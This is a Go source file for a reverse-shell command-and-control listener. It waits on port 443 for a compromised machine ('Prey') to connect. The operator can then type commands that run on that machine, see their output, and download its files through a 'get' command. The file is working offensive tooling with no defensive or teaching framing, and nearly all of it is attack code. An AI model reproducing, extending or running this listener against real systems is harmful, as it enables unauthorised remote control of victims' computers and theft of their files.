package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"

	"github.com/fatih/color"
)

// FILEREADBUFFSIZE Sets limit for reading file transfer buffer.
const FILEREADBUFFSIZE = 512

//443 set server port here
const PORT = ":443"

func main() {
	redc := color.New(color.FgHiRed, color.Bold)
	greenc := color.New(color.FgHiGreen, color.Bold)
	cyanc := color.New(color.FgCyan, color.Bold)

	var recvdcmd [512]byte //stores output from reverse shell

	cyanc.Println("Wait for Prey ...ZZZzzz")
	listner, _ := net.Listen("tcp", PORT)
	conn, _ := listner.Accept()
	for {
		reader := bufio.NewReader(os.Stdin)
		redc.Print("[hooked]")
		command, _ := reader.ReadString('\n')
		if strings.Compare(command, "bye") == 0 {
			conn.Write([]byte(command))
			conn.Close()
			os.Exit(0)
		} else if strings.Index(command, "get") == 0 {
			getFilewithNameandSize(conn, command)

		} else {
			conn.Write([]byte(command))
			for {
				chunkbytes, _ := conn.Read(recvdcmd[0:])
				//fmt.Println(string(recvdcmd[0:n]))
				//if string(recvdcmd[0:n]) == "END"
				if chunkbytes < 512 {
					//finaloutput = string(recvdcmd[0:chunkbytes]) + finaloutput
					greenc.Println(string(recvdcmd[0:chunkbytes]))
					break
				} else {
					greenc.Println(string(recvdcmd[0:chunkbytes]))

				}
			}
		}

	}

}

func getFilewithNameandSize(connection net.Conn, command string) {

	connection.Write([]byte(command))

	bufferFileName := make([]byte, 64)
	bufferFileSize := make([]byte, 10)

	connection.Read(bufferFileSize)

	fileSize, _ := strconv.ParseInt(strings.Trim(string(bufferFileSize), ":"), 10, 64)
	fmt.Println("File Size : ", fileSize)

	connection.Read(bufferFileName)
	fileName := strings.Trim(string(bufferFileName), ":")

	fmt.Println("File Name : ", fileName)

	newFile, err := os.Create(fileName)

	if err != nil {
		fmt.Println(err)
	}
	defer newFile.Close()
	var receivedBytes int64

	for {
		if (fileSize - receivedBytes) < FILEREADBUFFSIZE {
			io.CopyN(newFile, connection, (fileSize - receivedBytes))
			connection.Read(make([]byte, (receivedBytes+FILEREADBUFFSIZE)-fileSize))
			break
		}
		io.CopyN(newFile, connection, FILEREADBUFFSIZE)
		receivedBytes += FILEREADBUFFSIZE
	}
	fmt.Println("File Download Completed ! ")
	return
}
